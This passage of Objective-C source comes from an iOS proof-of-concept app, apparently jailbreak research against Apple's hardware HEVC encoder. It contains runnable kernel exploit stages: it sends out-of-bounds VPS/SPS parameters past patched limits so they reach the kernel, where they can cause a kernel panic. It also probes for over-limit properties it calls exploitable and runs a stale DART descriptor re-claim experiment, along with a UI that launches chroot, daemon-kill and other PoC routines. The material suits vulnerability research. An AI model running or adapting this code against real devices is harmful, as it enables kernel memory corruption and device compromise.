        INFO(@"3. No panic, no hits → stale descriptor didn't fire in window.");
        INFO(@"   → Extend poll, or fire needs session state (revisit).");
        INFO(@"4. Panic during PHASE 3 (FREE) → F≈U: fire synchronized");
        INFO(@"   with unmap. ARM→FREE→CLONE can never succeed.");
        INFO(@"   → Need D-prep-2-style keep-alive variant.");
        INFO(@"5. Write hit a surface ISR memcpy doesn't copy into output.");
        INFO(@"   (corruption in coded buffer but not in CMSampleBuffer).");
        INFO(@"   → Need Ghidra surface-index mapping of ISR memcpy source.");
        if (inputDiffs > 0) {
            PASS(@"BUT: Input surface DID change (%d bytes)!", inputDiffs);
            LOG(@"The stale descriptor hit an external mapping — this is");
            LOG(@"actually a BETTER primitive (direct read of the write).");
        }
        os_log(eLog, "JBPoC-EXP3 RESULT NO_BITSTREAM_HITS inputHit=%d", inputDiffs);
    }
    LOG(@"═══════════════════════════════════════════════");

    // Write results
    NSString *resultStr = [NSString stringWithFormat:
        @"EXP3 MODE A RESULT\nDate: %@\nBitstream hits: %d\nFirst hit frame: %d\n"
        @"Input surface diffs: %d\nBaseline frames: %d\nClone frames: %d\n"
        @"Total poll: %ds\nHit report:\n%@\n",
        [NSDate date], hitCount, firstHitFrame, inputDiffs,
        baselineCount, finalCount, EXP3_POLL_SECS, hitReport];
    NSString *resultPath = [NSHomeDirectory()
        stringByAppendingPathComponent:@"Documents/exp3_result.txt"];
    [resultStr writeToFile:resultPath atomically:YES
                  encoding:NSUTF8StringEncoding error:nil];
    INFO(@"Results written to %@", resultPath);

    // Cleanup
    VTCompressionSessionInvalidate(cloneSession);
    CFRelease(cloneSession);
    CVPixelBufferRelease(clonePB);
    exp3FreeSamples();
    for (int i = 0; i < (int)baselineData.count; i++) {
        // NSArray retains, autoreleased
    }

    PASS(@"Exp 3.0 complete. Device may panic from stale descriptor.");
    LOG(@"Keep the panic .ips if it happens!");
}

// ============================================================
// Tier 1b: OOB trigger — ONLY for properties verified by oracle
// ============================================================

static void runTier1bOOB(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  TIER 1b: VPS/SPS OOB via Encode      ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***       ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"AlphaLayerID and RepFormatIndex accept values far");
    INFO(@"over patched limits with NO userspace validation.");
    INFO(@"Encoding with these values sends them to the kernel.");
    pocLog(@"");

    // --- Test A: AlphaLayerID OOB ---
    LOG(@"=== Test A: AlphaLayerID = 64 (limit <63) ===");
    INFO(@"Starting with modest OOB (64) before going larger...");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }
    PASS(@"HEVC session created");

    // Set AlphaLayerID to 64 (1 past the patched limit of <63)
    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(64));
    INFO(@"Set AlphaLayerID=64: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    // Verify readback (check if it's clamped like temporal layers was)
    CFTypeRef readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"Readback: AlphaLayerID = %@", (__bridge id)readBack);
        int val = [(__bridge NSNumber *)readBack intValue];
        if (val == 64) {
            PASS(@"Value NOT clamped — 64 will reach the kernel!");
        } else {
            INFO(@"Value was clamped to %d — kernel may not see 64", val);
        }
        CFRelease(readBack);
    } else {
        INFO(@"Readback returned nil");
    }

    // Enable alpha encoding (may be required for AlphaLayerID to matter)
    VTSessionSetProperty(session, CFSTR("EncodesAlpha"), kCFBooleanTrue);

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        INFO(@"PrepareToEncode failed — trying without EncodesAlpha...");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);

        // Retry without EncodesAlpha
        status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            oobOutputCallback, NULL, &session);
        if (status != noErr) { FAIL(@"Retry failed"); return; }

        VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(64));

        status = VTCompressionSessionPrepareToEncodeFrames(session);
        INFO(@"PrepareToEncode (no alpha): %d", (int)status);
        if (status != noErr) {
            FAIL(@"PrepareToEncode failed again: %d", (int)status);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            return;
        }
    }

    // Create pixel buffer and encode
    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    pocLog(@"");
    LOG(@"*** ENCODING WITH AlphaLayerID=64 ***");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    PASS(@"Test A survived — AlphaLayerID=64");
    pocLog(@"");

    // --- Test B: RepFormatIndex OOB ---
    LOG(@"=== Test B: RepFormatIndex = 10 (limit <2) ===");

    status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
        (__bridge CFTypeRef)@(10));
    INFO(@"Set RepFormatIndex=10: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"Readback: RepFormatIndex = %@", (__bridge id)readBack);
        int val = [(__bridge NSNumber *)readBack intValue];
        if (val == 10) {
            PASS(@"Value NOT clamped — 10 will reach the kernel!");
        } else {
            INFO(@"Value was clamped to %d", val);
        }
        CFRelease(readBack);
    }

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d — kernel caught it at alloc?", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    pocLog(@"");
    LOG(@"*** ENCODING WITH RepFormatIndex=10 ***");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    PASS(@"Test B survived — RepFormatIndex=10");
    pocLog(@"");

    INFO(@"Both tests survived. The OOB values may have:");
    INFO(@"  1. Hit non-critical heap padding");
    INFO(@"  2. Been ignored by the encode path (not used for this profile)");
    INFO(@"  3. Caused silent corruption (check for weird behavior)");
    INFO(@"Next: escalate OOB distance or try multi-view HEVC mode.");
}

static void runTier2Probe(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  TIER 2: VPS/SPS/PPS Bound Probing    ║");
    pocLog(@"║  Safe — no encoding, just set/read     ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }

    // log2_max_minus4 (patched limit: <= 12)
    LOG(@"=== log2_max_minus4 (limit: <=12) ===");
    int logTests[] = {0, 4, 8, 12, 13, 16, 20, 28, 60};
    for (int i = 0; i < 9; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("log2_max_minus4"), (__bridge CFTypeRef)@(logTests[i]));
        INFO(@"log2_max_minus4=%d: %s %s", logTests[i],
            status == noErr ? "OK" : "REJECTED",
            logTests[i] > 12 ? "*** OVER LIMIT ***" : "");
    }

    // VPS Alpha Layer ID (limit: < 63)
    pocLog(@"");
    LOG(@"=== VPS AlphaLayerID (limit: <63) ===");
    int layerTests[] = {0, 32, 62, 63, 64, 100, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(layerTests[i]));
        INFO(@"AlphaLayerID=%d: %s %s", layerTests[i],
            status == noErr ? "OK" : "REJECTED",
            layerTests[i] >= 63 ? "*** OVER LIMIT ***" : "");
    }

    // SPS Rep Format Index (limit: < 2)
    pocLog(@"");
    LOG(@"=== SPS RepFormatIndex (limit: <2) ===");
    int repTests[] = {0, 1, 2, 3, 10, 50, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
            (__bridge CFTypeRef)@(repTests[i]));
        INFO(@"RepFormatIndex=%d: %s %s", repTests[i],
            status == noErr ? "OK" : "REJECTED",
            repTests[i] >= 2 ? "*** OVER LIMIT ***" : "");
    }

    // NumberOfSlices
    pocLog(@"");
    LOG(@"=== NumberOfSlices ===");
    int sliceTests[] = {1, 4, 16, 64, 256, 257, 1000};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("NumberOfSlices"), (__bridge CFTypeRef)@(sliceTests[i]));
        INFO(@"NumberOfSlices=%d: %s", sliceTests[i],
            status == noErr ? "OK" : "REJECTED");
    }

    // ChromaQPIndexOffsetMultiPPS (limit: <= 5)
    pocLog(@"");
    LOG(@"=== ChromaQPOffset (limit: <=5) ===");
    int chromaTests[] = {0, 3, 5, 6, 10, 50, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("ChromaQPIndexOffsetMultiPPS"),
            (__bridge CFTypeRef)@(chromaTests[i]));
        INFO(@"ChromaQPOffset=%d: %s %s", chromaTests[i],
            status == noErr ? "OK" : "REJECTED",
            chromaTests[i] > 5 ? "*** OVER LIMIT ***" : "");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");
    INFO(@"Probing complete. Properties accepting over-limit values are exploitable.");
}

// ============================================================
// App UI
// ============================================================

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow *window;
@end

@interface PoCViewController : UIViewController
@property (strong) UITextView *logView;
@property (strong) UIButton *chrootBtn;
@property (strong) UIButton *ave2Btn;
@property (strong) UIButton *propDumpBtn;
@property (strong) UIButton *tier2Btn;
@property (strong) UIButton *tier1Btn;
@property (strong) UIButton *bothBtn;
@property (strong) UIButton *exportBtn;
@end

@implementation PoCViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;

    CGFloat w = self.view.bounds.size.width;
    CGFloat top = 60;
    CGFloat btnH = 44;
    CGFloat gap = 8;
    CGFloat pad = 16;
    CGFloat btnW = (w - pad * 2 - gap) / 2;

    self.chrootBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.chrootBtn.frame = CGRectMake(pad, top, btnW, btnH);
    [self.chrootBtn setTitle:@"Chroot PoC" forState:UIControlStateNormal];
    self.chrootBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.chrootBtn.layer.cornerRadius = 8;
    [self.chrootBtn setTitleColor:UIColor.cyanColor forState:UIControlStateNormal];
    [self.chrootBtn addTarget:self action:@selector(runChroot) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.chrootBtn];

    self.ave2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.ave2Btn.frame = CGRectMake(pad + btnW + gap, top, btnW, btnH);
    [self.ave2Btn setTitle:@"AVE2 PoC" forState:UIControlStateNormal];
    self.ave2Btn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.ave2Btn.layer.cornerRadius = 8;
    [self.ave2Btn setTitleColor:UIColor.orangeColor forState:UIControlStateNormal];
    [self.ave2Btn addTarget:self action:@selector(runAVE2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.ave2Btn];

    CGFloat row2 = top + btnH + gap;

    self.propDumpBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.propDumpBtn.frame = CGRectMake(pad, row2, btnW, btnH);
    [self.propDumpBtn setTitle:@"Dump Props" forState:UIControlStateNormal];
    self.propDumpBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.propDumpBtn.layer.cornerRadius = 8;
    [self.propDumpBtn setTitleColor:UIColor.yellowColor forState:UIControlStateNormal];
    [self.propDumpBtn addTarget:self action:@selector(runPropDump) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.propDumpBtn];

    self.tier2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.tier2Btn.frame = CGRectMake(pad + btnW + gap, row2, btnW, btnH);
    [self.tier2Btn setTitle:@"Tier 2 Probe" forState:UIControlStateNormal];
    self.tier2Btn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.tier2Btn.layer.cornerRadius = 8;
    [self.tier2Btn setTitleColor:UIColor.magentaColor forState:UIControlStateNormal];
    [self.tier2Btn addTarget:self action:@selector(runTier2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.tier2Btn];

    CGFloat row3 = row2 + btnH + gap;

    self.tier1Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.tier1Btn.frame = CGRectMake(pad, row3, btnW, btnH);
    [self.tier1Btn setTitle:@"OOB Temporal" forState:UIControlStateNormal];
    self.tier1Btn.backgroundColor = [UIColor colorWithRed:0.3 green:0.0 blue:0.0 alpha:1];
    self.tier1Btn.layer.cornerRadius = 8;
    self.tier1Btn.layer.borderWidth = 1;
    self.tier1Btn.layer.borderColor = UIColor.redColor.CGColor;
    [self.tier1Btn setTitleColor:UIColor.redColor forState:UIControlStateNormal];
    [self.tier1Btn addTarget:self action:@selector(runTier1) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.tier1Btn];

    UIButton *verifyBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    verifyBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
    verifyBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.15 blue:0.3 alpha:1];
    verifyBtn.layer.cornerRadius = 8;
    verifyBtn.layer.borderWidth = 1;
    verifyBtn.layer.borderColor = UIColor.cyanColor.CGColor;
    [verifyBtn setTitle:@"Verify Oracle" forState:UIControlStateNormal];
    [verifyBtn setTitleColor:UIColor.cyanColor forState:UIControlStateNormal];
    [verifyBtn addTarget:self action:@selector(runVerify) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:verifyBtn];

    CGFloat row4 = row3 + btnH + gap;

    UIButton *narrowBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    narrowBtn.frame = CGRectMake(pad, row4, btnW, btnH);
    narrowBtn.backgroundColor = [UIColor colorWithRed:0.3 green:0.15 blue:0.0 alpha:1];
    narrowBtn.layer.cornerRadius = 8;
    narrowBtn.layer.borderWidth = 2;
    narrowBtn.layer.borderColor = [UIColor orangeColor].CGColor;
    [narrowBtn setTitle:@"Narrow Panic" forState:UIControlStateNormal];
    [narrowBtn setTitleColor:UIColor.orangeColor forState:UIControlStateNormal];
    [narrowBtn addTarget:self action:@selector(runNarrow) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:narrowBtn];

    self.bothBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.bothBtn.frame = CGRectMake(pad + btnW + gap, row4, btnW, btnH);
    [self.bothBtn setTitle:@"Run Recon" forState:UIControlStateNormal];
    self.bothBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.bothBtn.layer.cornerRadius = 8;
    [self.bothBtn setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
    [self.bothBtn addTarget:self action:@selector(runBoth) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.bothBtn];

    // Phase 2 buttons — row 5: idle-wait, truncation, boundary
    CGFloat row5 = row4 + btnH + gap;
    CGFloat p2BtnW = (w - pad * 2 - gap * 2) / 3;

    UIButton *idleBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    idleBtn.frame = CGRectMake(pad, row5, p2BtnW, btnH);
    idleBtn.backgroundColor = [UIColor colorWithRed:0.4 green:0.0 blue:0.0 alpha:1];
    idleBtn.layer.cornerRadius = 8;
    idleBtn.layer.borderWidth = 2;
    idleBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.3 blue:0.0 alpha:1].CGColor;
    idleBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [idleBtn setTitle:@"Idle Wait" forState:UIControlStateNormal];
    [idleBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.3 blue:0.0 alpha:1] forState:UIControlStateNormal];
    [idleBtn addTarget:self action:@selector(runIdleWait) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:idleBtn];

    UIButton *truncBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    truncBtn.frame = CGRectMake(pad + p2BtnW + gap, row5, p2BtnW, btnH);
    truncBtn.backgroundColor = [UIColor colorWithRed:0.35 green:0.0 blue:0.15 alpha:1];
    truncBtn.layer.cornerRadius = 8;
    truncBtn.layer.borderWidth = 2;
    truncBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.5 alpha:1].CGColor;
    truncBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [truncBtn setTitle:@"Truncation" forState:UIControlStateNormal];
    [truncBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.5 alpha:1] forState:UIControlStateNormal];
    [truncBtn addTarget:self action:@selector(runTruncation) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:truncBtn];

    UIButton *boundBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    boundBtn.frame = CGRectMake(pad + (p2BtnW + gap) * 2, row5, p2BtnW, btnH);
    boundBtn.backgroundColor = [UIColor colorWithRed:0.3 green:0.0 blue:0.3 alpha:1];
    boundBtn.layer.cornerRadius = 8;
    boundBtn.layer.borderWidth = 2;
    boundBtn.layer.borderColor = [UIColor colorWithRed:0.8 green:0.0 blue:1.0 alpha:1].CGColor;
    boundBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [boundBtn setTitle:@"Boundary" forState:UIControlStateNormal];
    [boundBtn setTitleColor:[UIColor colorWithRed:0.8 green:0.0 blue:1.0 alpha:1] forState:UIControlStateNormal];
    [boundBtn addTarget:self action:@selector(runBoundary) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:boundBtn];

    // Phase 2E buttons — row 6: teardown test
    CGFloat row6 = row5 + btnH + gap;

    UIButton *teardownBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    teardownBtn.frame = CGRectMake(pad, row6, w - pad * 2, btnH);
    teardownBtn.backgroundColor = [UIColor colorWithRed:0.5 green:0.1 blue:0.0 alpha:1];
    teardownBtn.layer.cornerRadius = 8;
    teardownBtn.layer.borderWidth = 2;
    teardownBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.5 blue:0.0 alpha:1].CGColor;
    teardownBtn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
    [teardownBtn setTitle:@"2E-0: Teardown Test (A→B→C cycle)" forState:UIControlStateNormal];
    [teardownBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.5 blue:0.0 alpha:1] forState:UIControlStateNormal];
    [teardownBtn addTarget:self action:@selector(runTeardown) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:teardownBtn];

    // Run B v2 button — row 7: frame-by-frame DART re-use test
    CGFloat row7 = row6 + btnH + gap;

    UIButton *runBv2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    runBv2Btn.frame = CGRectMake(pad, row7, w - pad * 2, btnH);
    runBv2Btn.backgroundColor = [UIColor colorWithRed:0.6 green:0.0 blue:0.1 alpha:1];
    runBv2Btn.layer.cornerRadius = 8;
    runBv2Btn.layer.borderWidth = 2;
    runBv2Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.2 blue:0.2 alpha:1].CGColor;
    runBv2Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
    [runBv2Btn setTitle:@"Run B v2: DART Re-use (10 frames)" forState:UIControlStateNormal];
    [runBv2Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.2 blue:0.2 alpha:1] forState:UIControlStateNormal];
    [runBv2Btn addTarget:self action:@selector(runRunBv2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:runBv2Btn];

    // Run C1/C2 buttons — row 8: fire-control tests
    CGFloat row8 = row7 + btnH + gap;
    CGFloat runCBtnW = (w - pad * 2 - gap) / 2;

    UIButton *runCBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    runCBtn.frame = CGRectMake(pad, row8, runCBtnW, btnH);
    runCBtn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
    runCBtn.layer.cornerRadius = 8;
    runCBtn.layer.borderWidth = 2;
    runCBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
    runCBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
    [runCBtn setTitle:@"C1: Client Death" forState:UIControlStateNormal];
    [runCBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
    [runCBtn addTarget:self action:@selector(runRunC1) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:runCBtn];

    UIButton *runCAltBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    runCAltBtn.frame = CGRectMake(pad + runCBtnW + gap, row8, runCBtnW, btnH);
    runCAltBtn.backgroundColor = [UIColor colorWithRed:0.5 green:0.0 blue:0.3 alpha:1];
    runCAltBtn.layer.cornerRadius = 8;
    runCAltBtn.layer.borderWidth = 2;
    runCAltBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
    runCAltBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
    [runCAltBtn setTitle:@"C2: Daemon Kill" forState:UIControlStateNormal];
    [runCAltBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
    [runCAltBtn addTarget:self action:@selector(runRunC2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:runCAltBtn];

    // D-prep button — row 9: in-place surface readout (Model b test)
    CGFloat row9 = row8 + btnH + gap;

    CGFloat dBtnW = (w - pad * 2 - gap) / 2;

    UIButton *dPrepBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    dPrepBtn.frame = CGRectMake(pad, row9, dBtnW, btnH);
    dPrepBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.3 blue:0.5 alpha:1];
    dPrepBtn.layer.cornerRadius = 8;
    dPrepBtn.layer.borderWidth = 2;
    dPrepBtn.layer.borderColor = [UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1].CGColor;
    dPrepBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
    [dPrepBtn setTitle:@"D-Prep: Input" forState:UIControlStateNormal];
    [dPrepBtn setTitleColor:[UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1] forState:UIControlStateNormal];
    [dPrepBtn addTarget:self action:@selector(runDPrep) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:dPrepBtn];

    UIButton *dPrep2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    dPrep2Btn.frame = CGRectMake(pad + dBtnW + gap, row9, dBtnW, btnH);
    dPrep2Btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.2 blue:0.5 alpha:1];
    dPrep2Btn.layer.cornerRadius = 8;
    dPrep2Btn.layer.borderWidth = 2;
    dPrep2Btn.layer.borderColor = [UIColor colorWithRed:0.3 green:0.6 blue:1.0 alpha:1].CGColor;
    dPrep2Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
    [dPrep2Btn setTitle:@"D-Prep-2: Output" forState:UIControlStateNormal];
    [dPrep2Btn setTitleColor:[UIColor colorWithRed:0.3 green:0.6 blue:1.0 alpha:1] forState:UIControlStateNormal];
    [dPrep2Btn addTarget:self action:@selector(runDPrep2) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:dPrep2Btn];

    // Experiment 3.0: Mode A Re-claim — row 10 (full width, gold)
    CGFloat row10 = row9 + btnH + gap;

    UIButton *exp3Btn = [UIButton buttonWithType:UIButtonTypeSystem];
    exp3Btn.frame = CGRectMake(pad, row10, w - pad * 2, btnH);
    exp3Btn.backgroundColor = [UIColor colorWithRed:0.4 green:0.3 blue:0.0 alpha:1];
    exp3Btn.layer.cornerRadius = 8;
    exp3Btn.layer.borderWidth = 2;
    exp3Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1].CGColor;
    exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
    [exp3Btn setTitle:@"Exp 3.0: Mode A DART Re-claim" forState:UIControlStateNormal];
    [exp3Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1] forState:UIControlStateNormal];
    [exp3Btn addTarget:self action:@selector(runExp3) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:exp3Btn];

    CGFloat logTop = row10 + btnH + gap;
    self.logView = [[UITextView alloc] initWithFrame:
        CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
    self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.logView.editable = NO;
    self.logView.font = [UIFont fontWithName:@"Menlo" size:10];
    self.logView.textColor = UIColor.greenColor;
    self.logView.backgroundColor = UIColor.blackColor;
    self.logView.contentInset = UIEdgeInsetsMake(8, 8, 50, 8);
    [self.view addSubview:self.logView];
    g_logView = self.logView;

    // Show device info immediately
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        printDeviceInfo();
    });
}

- (void)runChroot {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runChrootPoC();
    });
}

- (void)runAVE2 {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runAVE2PoC();
    });
}

